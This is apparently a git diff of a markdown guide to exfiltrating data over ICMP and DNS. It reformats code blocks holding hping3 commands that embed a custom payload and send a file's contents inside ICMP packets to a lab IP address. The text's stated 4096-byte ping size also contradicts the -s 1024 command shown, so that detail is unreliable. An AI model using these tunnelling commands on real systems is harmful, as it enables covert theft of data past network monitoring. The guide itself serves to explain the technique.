@@ -6,11 +6,15 @@ Ping operates by sending Internet Control Message Protocol (ICMP) echo reqtest p
 
 The following command will send a ping request with the size of 4096:
 
-```$ ping 127.0.0.1 -s 1024```
+```
+$ ping 127.0.0.1 -s 1024
+```
 
 The payload of 4096 is junk **until** you add your own payload:
 
-```$sudo hping3 127.0.0.1 -1 --sign="Hello world!"```
+```
+$ sudo hping3 127.0.0.1 -1 --sign="Hello world!"
+```
 
 or even send a file:
 
@@ -19,6 +23,8 @@ $ sudo hping3 192.168.179.131 -1 --file send.txt --data 100
 ```
 
 ## DNS protocol
+
+An image worth a thousand words...
 
 ![DNS Data Exfiltration](docs/dns_data_exfiltration.png)
 
